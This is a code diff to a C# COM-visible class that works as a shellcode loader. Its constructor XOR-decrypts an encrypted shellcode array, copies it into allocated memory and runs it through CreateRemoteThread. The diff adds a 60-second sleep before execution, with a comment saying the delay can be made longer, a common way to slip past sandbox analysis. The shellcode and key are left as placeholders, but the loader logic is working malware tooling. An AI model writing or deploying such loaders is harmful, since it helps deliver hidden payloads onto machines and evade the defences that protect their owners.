@@ -1,6 +1,7 @@
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using System.Threading;
 
 [ComVisible(true)]
 public class TestClass
@@ -11,17 +12,16 @@ public class TestClass
 
     public TestClass()
     {
-        // Modify this constructor to execute the shellcode instead of displaying a message box
         ExecuteShellcode();
     }
 
     private void ExecuteShellcode()
     {
         // Encrypted shellcode
-        byte[] encryptedShellcode = {*/ Your Shellcode Here */}; // Replace with your encrypted shellcode
+        byte[] encryptedShellcode = {/* Add Shellcode Here */ }; // Replace with your encrypted shellcode
 
         // XOR decryption key
-        byte key = */ Your XOR Decryption Key Here */; // XOR decryption key
+        byte key = /* Add decryption key here */; // XOR decryption key
 
         // Decrypt the shellcode
         XorDecrypt(encryptedShellcode, key);
@@ -32,6 +32,9 @@ public class TestClass
         // Copy the decrypted shellcode into the allocated memory
         Marshal.Copy(encryptedShellcode, 0, addr, encryptedShellcode.Length);
 
+        // Wait for 60 seconds before executing the shellcode - change this to as long as you want
+        Thread.Sleep(60000);
+
         // Execute the shellcode
         IntPtr processHandle = Process.GetCurrentProcess().Handle;
         IntPtr threadHandle = IntPtr.Zero;
@@ -39,7 +42,6 @@ public class TestClass
         IntPtr parameter = IntPtr.Zero;
         uint creationFlags = 0;
         uint threadId;
-        IntPtr threadHandlePtr = IntPtr.Zero;
 
         threadHandle = CreateRemoteThread(processHandle, IntPtr.Zero, 0, startAddress, parameter, creationFlags, out threadId);
 
